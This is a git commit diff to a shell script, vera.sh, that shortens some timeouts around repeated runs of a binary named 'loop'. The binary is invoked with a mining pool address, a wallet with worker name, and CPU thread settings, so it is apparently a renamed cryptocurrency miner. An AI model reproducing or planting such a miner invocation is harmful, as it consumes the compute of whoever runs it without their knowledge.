3af3cd4f1d83ced73fc6802d070ad5b719ed2044
cihuuy <95659029+cihuuy@users.noreply.github.com>
2021-12-26 07:13:56 +0530

    Update vera.sh

--- vera.sh
+++ vera.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
-timeout -k 30s 480s ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 8
-timeout -k 30s 480s ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 8
+timeout -k 30s 120s ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 8
+timeout -k 30s 120s ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 8
 timeout -k 30s 480s ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 8
 timeout -k 30s 480s ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 8
 
